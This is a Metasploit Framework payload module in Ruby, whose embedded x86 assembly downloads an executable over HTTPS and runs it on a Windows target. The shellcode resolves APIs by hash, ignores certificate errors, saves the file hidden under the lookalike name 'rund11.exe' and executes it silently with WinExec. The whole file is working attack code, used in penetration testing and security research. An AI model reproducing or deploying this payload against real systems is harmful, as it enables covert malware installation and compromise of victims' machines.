##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


module Metasploit3

	include Msf::Payload::Windows
	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Windows Executable Download & Execute (https), supports proxy',
			'Description'   => 'Download an EXE from a URL using HTTPS (with proxy support) and execute it',
			'Author'        =>
				[
					'corelanc0d3r <peter.ve[at]corelan.be>'
				],
			'License'       => MSF_LICENSE,
			'Version'       => "$Revision$",
			'Platform'      => 'win',
			'Arch'          => ARCH_X86
		))

		# EXITFUNC is not supported 
		deregister_options('EXITFUNC')

		# Register command execution options
		register_options(
			[
				OptString.new('RHOST', [ true, "The webserver hosting the executable to download" ]),
				OptString.new('URI', [true, "The full URI to the binary" ,"/"]),
				OptInt.new('PORT', [ true, "The HTTPS port to connect to", 443]),
				OptString.new('EXE', [ true, "Filename to save & run executable on target system", "rund11.exe" ])
			], self.class)
	end

	#
	# Construct the payload
	#
	def generate

		port_nr		= datastore['PORT'] || 443
		server_host	= datastore['RHOST']
		server_uri	= datastore['URI']
		filename	= datastore['EXE']

		#create actual payload
		payload_data = <<EOS
	cld
	call start
; Stephen Fewer's block_api
; block_api code (Stephen Fewer)
api_call:
	pushad                 ; We preserve all the registers for the caller, bar EAX and ECX.
	mov ebp, esp           ; Create a new stack frame
	xor edx, edx           ; Zero EDX
	mov edx, fs:[edx+48]   ; Get a pointer to the PEB
	mov edx, [edx+12]      ; Get PEB->Ldr
	mov edx, [edx+20]      ; Get the first module from the InMemoryOrder module list
next_mod:
	mov esi, [edx+40]      ; Get pointer to modules name (unicode string)
	movzx ecx, word [edx+38] ; Set ECX to the length we want to check 
	xor edi, edi           ; Clear EDI which will store the hash of the module name
loop_modname:            ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the name
	cmp al, 'a'            ; Some versions of Windows use lower case module names
	jl not_lowercase       ;
	sub al, 0x20           ; If so normalise to uppercase
not_lowercase:           ;
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	loop loop_modname      ; Loop untill we have read enough
	; We now have the module hash computed
	push edx               ; Save the current position in the module list for later
	push edi               ; Save the current module hash for later
	; Proceed to iterate the export address table, 
	mov edx, [edx+16]      ; Get this modules base address
	mov eax, [edx+60]      ; Get PE header
	add eax, edx           ; Add the modules base address
	mov eax, [eax+120]     ; Get export tables RVA
	test eax, eax          ; Test if no export address table is present
	jz get_next_mod1       ; If no EAT present, process the next module
	add eax, edx           ; Add the modules base address
	push eax               ; Save the current modules EAT
	mov ecx, [eax+24]      ; Get the number of function names  
	mov ebx, [eax+32]      ; Get the rva of the function names
	add ebx, edx           ; Add the modules base address
	; Computing the module hash + function hash
get_next_func:           ;
	jecxz get_next_mod     ; When we reach the start of the EAT (we search backwards), process the next module
	dec ecx                ; Decrement the function name counter
	mov esi, [ebx+ecx*4]   ; Get rva of next module name
	add esi, edx           ; Add the modules base address
	xor edi, edi           ; Clear EDI which will store the hash of the function name
	; And compare it to the one we want
loop_funcname:           ;
	xor eax, eax           ; Clear EAX
	lodsb                  ; Read in the next byte of the ASCII function name
	ror edi, 13            ; Rotate right our hash value
	add edi, eax           ; Add the next byte of the name
	cmp al, ah             ; Compare AL (the next byte from the name) to AH (null)
	jne loop_funcname      ; If we have not reached the null terminator, continue
	add edi, [ebp-8]       ; Add the current module hash to the function hash
	cmp edi, [ebp+36]      ; Compare the hash to the one we are searchnig for 
	jnz get_next_func      ; Go compute the next function hash if we have not found it
	; If found, fix up stack, call the function and then value else compute the next one...
	pop eax                ; Restore the current modules EAT
	mov ebx, [eax+36]      ; Get the ordinal table rva      
	add ebx, edx           ; Add the modules base address
	mov cx, [ebx+2*ecx]    ; Get the desired functions ordinal
	mov ebx, [eax+28]      ; Get the function addresses table rva  
	add ebx, edx           ; Add the modules base address
	mov eax, [ebx+4*ecx]   ; Get the desired functions RVA
	add eax, edx           ; Add the modules base address to get the functions actual VA
	; We now fix up the stack and perform the call to the desired function...
finish:
	mov [esp+36], eax      ; Overwrite the old EAX value with the desired api address for the upcoming popad
	pop ebx                ; Clear off the current modules hash
	pop ebx                ; Clear off the current position in the module list
	popad                  ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered
	pop ecx                ; Pop off the origional return address our caller will have pushed
	pop edx                ; Pop off the hash value our caller will have pushed
	push ecx               ; Push back the correct return value
	jmp eax                ; Jump into the required function
	; We now automagically return to the correct caller...
get_next_mod:            ;
	pop eax                ; Pop off the current (now the previous) modules EAT
get_next_mod1:           ;
	pop edi                ; Pop off the current (now the previous) modules hash
	pop edx                ; Restore our position in the module list
	mov edx, [edx]         ; Get the next module
	jmp next_mod     	; Process this module

; actual routine
start:
	pop ebp			; get ptr to block_api routine
; based on HDM's block_reverse_https.asm
load_wininet:
	push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
	push 0x696e6977        ; ...
	mov esi, esp           ; Save a pointer to wininet
	push esp               ; Push a pointer to the "wininet" string on the stack.
	push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
	call ebp               ; LoadLibraryA( "wininet" )

internetopen:
	xor edi,edi
	push edi               ; DWORD dwFlags
	push edi               ; LPCTSTR lpszProxyBypass
	push edi               ; LPCTSTR lpszProxyName
	push edi               ; DWORD dwAccessType (PRECONFIG = 0)
	push esi               ; LPCTSTR lpszAgent ("wininet\x00")
	push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
	call ebp

	jmp dbl_get_server_host

internetconnect:
	pop ebx                ; Save the hostname pointer
	xor ecx, ecx
	push ecx               ; DWORD_PTR dwContext (NULL)
	push ecx               ; dwFlags
	push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
	push ecx               ; password
	push ecx               ; username
	push #{port_nr}        ; PORT
	push ebx               ; HOSTNAME
	push eax               ; HINTERNET hInternet
	push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
	call ebp

	jmp get_server_uri

httpopenrequest:
	pop ecx
	xor edx, edx           ; NULL
	push edx               ; dwContext (NULL)
	push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags
	;0x80000000 |        ; INTERNET_FLAG_RELOAD
	;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
	;0x00800000 |        ; INTERNET_FLAG_SECURE
	;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
	;0x00001000 |        ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
	;0x00002000 |        ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
	;0x00000200          ; INTERNET_FLAG_NO_UI
	push edx               ; accept types
	push edx               ; referrer
	push edx               ; version
	push ecx               ; url
	push edx               ; method
	push eax               ; hConnection
	push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
	call ebp
	mov esi, eax           ; hHttpRequest

set_retry:
	push 0x10
	pop ebx

; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
set_security_options:
	push 0x00003380
	mov eax, esp
	push 4                 ; sizeof(dwFlags)
	push eax               ; &dwFlags
	push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
	push esi               ; hRequest
	push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
	call ebp

httpsendrequest:
	xor edi, edi
	push edi               ; optional length
	push edi               ; optional
	push edi               ; dwHeadersLength
	push edi               ; headers
	push esi               ; hHttpRequest
	push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
	call ebp
	test eax,eax
	jnz allocate_memory

try_it_again:
	dec ebx
	jz failure
	jmp set_security_options

dbl_get_server_host:
	jmp get_server_host

get_server_uri:
	call httpopenrequest

server_uri:
	db "/#{server_uri}", 0x00

failure:
	push 0x56A2B5F0        ; hardcoded to exitprocess for size
	call ebp

allocate_memory:
	push 0x04              ; PAGE_READWRITE, doesn't need to be executable, less suspicious perhaps ?
	push 0x1000            ; MEM_COMMIT
	push 0x00400000        ; Stage allocation (8Mb ought to do us)
	push edi               ; NULL as we dont care where the allocation is (zero'd from the prev function)
	push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
	call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

download_prep:
	xchg eax, ebx          ; place the allocated base address in ebx
	push ebx               ; store a copy of the stage base address on the stack
	push ebx               ; temporary storage for bytes read count
	mov edi, esp           ; &bytesRead

download_more:
	push edi               ; &bytesRead
	push 8192              ; read length
	push ebx               ; buffer
	push esi               ; hRequest
	push 0xE2899612        ; hash( "wininet.dll", "InternetReadFile" )
	call ebp

	test eax,eax           ; download failed? (optional?)
	jz failure

	mov eax, [edi]
	add ebx, eax           ; buffer += bytes_received

	test eax,eax           ; optional?
	jnz download_more      ; continue until it returns 0
	pop eax                ; clear the temporary storage
	; eax = 0

; routine to save to file & execute
save_as_target_file:
	pop esi			; get start of buffer
	sub ebx,esi		; nr of bytes
	jmp get_filename
get_filename_return:
	pop edi			; ptr to filename
	push eax		; hTemplateFile
	push 2			; dwFlagsAndAttributes (Hidden)
	push 2			; dwCreationDisposition (CREATE_ALWAYS)
	push eax		; lpSecurityAttributes
	push 2			; dwShareMode
	push 2			; dwDesiredAccess
	push edi		; lpFileName
	push 0x4FDAF6DA		; kernel32.dll!CreateFileA
	call ebp
;write to the handle
	push 0			; lpOverLapped
	push esp		; lpNumberOfBytesWritten
	push ebx		; nNumberOfBytesToWrite
	push esi		; lpBuffer
	push eax		; hFile
	mov esi,eax		; save handle
	push 0x5BAE572D		; kernel32.dll!WriteFile
	call ebp

;close the handle
	push esi
	push 0x528796C6		; kernel32.dll!CloseHandle
	call ebp

execute_file:
	push 0			; don't show
	push edi		; lpCmdLine
	push 0x876F8B31		; kernel32.dll!WinExec
	call ebp

thats_all_folks:
	push 0
	push 0x56A2B5F0		;kernel32.dll!ExitProcess
	call ebp

get_filename:
	call get_filename_return
	db "#{filename}",0x00

get_server_host:
	call internetconnect

server_host:
	db "#{server_host}", 0x00
EOS
		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
	end
end
